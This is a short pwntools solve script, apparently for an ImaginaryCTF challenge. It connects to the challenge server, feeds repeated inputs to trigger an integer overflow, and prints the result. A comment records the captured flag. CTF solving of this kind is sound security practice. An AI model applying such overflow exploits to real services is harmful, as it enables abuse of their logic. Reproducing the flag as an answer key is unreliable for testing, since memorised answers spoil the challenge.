from pwn import remote

io = remote("puzzler7.imaginaryctf.org", 1015)
tot = 1000000
while tot > 0:
    io.sendlineafter(b">>> ", b"1")
    io.sendlineafter(b">>> ", b"4294")
    tot -= 4294
    print(tot)
io.sendlineafter(b">>> ", b"4")
print(io.recvallS().strip())
# ictf{integer_overflow_strikes_again!!}
